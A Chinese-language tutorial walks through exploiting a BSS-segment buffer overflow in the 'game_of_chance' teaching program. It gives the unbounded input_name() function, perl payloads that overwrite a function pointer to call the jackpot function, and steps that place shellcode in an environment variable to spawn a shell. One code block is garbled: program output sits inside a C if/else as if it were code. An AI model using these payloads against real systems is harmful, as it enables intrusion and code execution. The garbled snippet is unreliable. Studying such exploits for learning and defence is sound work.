### 作者：M0rk
### 作者博客：

#### 摘要
缓冲区溢出不仅包括常见的栈溢出和堆溢出，还有一种发生在BSS段上的溢出。BSS段属于数据段的一种，通常用于存储未初始化的全局静态变量。本文将探讨如何在BSS段上利用缓冲区溢出漏洞，并通过一个示例代码进行演示。测试环境为Ubuntu 14.04 X86。

#### 相关概念
- **BSS段**：BSS（Block Started by Symbol）段是数据段的一部分，用于存储未初始化的全局静态变量。
- **函数指针**：一种指向函数的指针，可以用来调用该函数。

#### 示例代码
以下代码片段来自`game_of_chance.c`文件：
```c
// 用户结构体，用于存储用户信息
struct user {
    int uid;
    int credits;
    int highscore;
    char name[100];
    int (*current_game) ();
};

struct user player; // 全局用户结构体
```

`game_of_chance`是一个小游戏，其中使用了一个函数指针`current_game`来保存上次玩的游戏。这个指针被声明为全局变量，因此`user`结构体变量存储在BSS段中。`name`字段用于存储用户的姓名，并且可以通过`input_name()`函数进行控制。

```c
void input_name() {
    char *name_ptr, input_char = '\n';
    while (input_char == '\n') { // 清除多余的换行符
        scanf("%c", &input_char);
    }
    name_ptr = (char *)&(player.name); // 获取玩家名字的地址
    while (input_char != '\n') { // 循环直到遇到换行符
        *name_ptr = input_char; // 将输入字符存入名字字段
        scanf("%c", &input_char); // 获取下一个字符
        name_ptr++; // 增加名字指针
    }
    *name_ptr = 0; // 终止字符串
}
```

该函数会接收用户输入的名字，直到用户输入换行符。由于没有对输入长度进行有效限制，因此可以被利用。此外，我们还需要程序调用这个函数指针，这可以在下面的代码片段中的第6、8或10行以及`play_the_game()`函数中实现。

```c
if (choice > 7) {
    printf("\n[!!] The number %d is an invalid selection.\n\n", choice);
} else if (choice < 1) {
    [DEBUG] current_game pointer @ 0x08048f15
    ####### Pick a Number ######
    This game costs 10 credits to play. Simply pick a number
    between 1 and 20, and if you pick the winning number, you
    will win the jackpot of 100 credits!
    10 credits have been deducted from your account.
    Pick a number between 1 and 20: The winning number is 11
    Sorry, you didn't win.
    You now have 80 credits
    Would you like to play again? (y/n)
}
```

#### 利用过程
通过覆盖`name`字段并使函数指针指向特定地址，我们可以触发jackpot函数，从而增加金币。例如：
```sh
perl -e 'print "1\n5\nn\n5\n" . "A"x100 . "\xa5\x8c\x04\x08\n" . "1\n" ."y\n"x10.  "n\n5\nM0rk\n7\n"' | ./game_of_chance
```

#### 获取Shell
我们还可以通过将shellcode写入环境变量，并将跳转地址指向shellcode来获取Shell。以下是具体步骤：
1. 设置环境变量`SHELLCODE`。
    ```sh
    echo $SHELLCODE
    111ə̀j
                                                              XQh//shh/binQS̀
    ```

2. 使用`getenvaddr`工具获取环境变量在程序运行时的地址。
    ```sh
    ./getenvaddr SHELLCODE ./game_of_chance
    SHELLCODE will be at 0xbffff206
    ```

3. 构造exploit并执行。
    ```sh
    perl -e 'print "1\n7\nn\n5\n" . "A"x100 . "\x06\xf2\xff\xbf\n" . "1\n"' > exploit_buff
    cat exploit_buff - | ./game_of_chance
    ```

#### 相关源码下载
- [GitHub仓库](https://github.com/kevien/exploitcode)

#### 参考资料
- 《Hacking: The Art of Exploitation》

希望本文能帮助你更好地理解BSS段上的缓冲区溢出漏洞及其利用方法。